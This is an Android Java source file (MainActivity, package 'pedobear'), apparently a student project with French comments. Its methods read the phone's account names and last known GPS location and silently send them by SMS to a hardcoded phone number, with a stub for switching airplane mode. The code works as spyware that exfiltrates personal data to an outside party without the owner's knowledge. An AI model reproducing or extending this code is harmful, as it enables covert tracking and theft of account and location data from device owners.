package com.ingesup.pedobear;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.location.Address;
import android.location.Criteria;
import android.location.GpsStatus;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.location.LocationProvider;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.provider.Settings;
import android.support.v7.app.ActionBarActivity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import java.lang.reflect.Method;


public class MainActivity extends ActionBarActivity {

    String position = " ";
    String account = " ";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Button btAction = (Button) findViewById(R.id.button);
        String texte = "";


        btAction.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                //TODO: Entrer les fonctions et les Scripts à executé
                //recupGPS();
                recupAccount();
                //planeMode();
            }
        });
    }


    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }

    public void recupGPS(){
        LocationManager locationManager = (LocationManager)getSystemService( Context.LOCATION_SERVICE );
        Criteria criteria = new Criteria();
        criteria.setAccuracy( Criteria.ACCURACY_COARSE );
        String provider = locationManager.getBestProvider( criteria, true );

        if ( provider == null ) {
            System.out.println("Problème");
            return;
        }
        Location lastLocation = locationManager.getLastKnownLocation(provider);
        double latitude = lastLocation.getLatitude();
        double longitude = lastLocation.getLongitude();

        position = "Latitude :" + latitude + "\n" + "Longitude :" + longitude;
        sendSMS(position);
    }

    public void recupAccount(){
        Account[] lstAcc = AccountManager.get(getApplicationContext()).getAccounts();
        for(Account Acc : lstAcc){
            account = account + "Compte: " + Acc.name + "/n";
        }
        Log.d("TestAccount", account);
        sendSMS(account);
    }

    protected void sendSMS(String recipient) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage("+33676826908", null, recipient, null, null);
            Toast.makeText(getApplicationContext(), "SMS Sent!",
                    Toast.LENGTH_LONG).show();
        } catch (Exception e) {
            Toast.makeText(getApplicationContext(),
                    "SMS faild, please try again later!",
                    Toast.LENGTH_LONG).show();
            e.printStackTrace();
        }
    }


    public void planeMode(){
        //Settings.Global.putInt(getApplicationContext().getContentResolver(), Settings.Global.AIRPLANE_MODE_ON, 0);
    }

}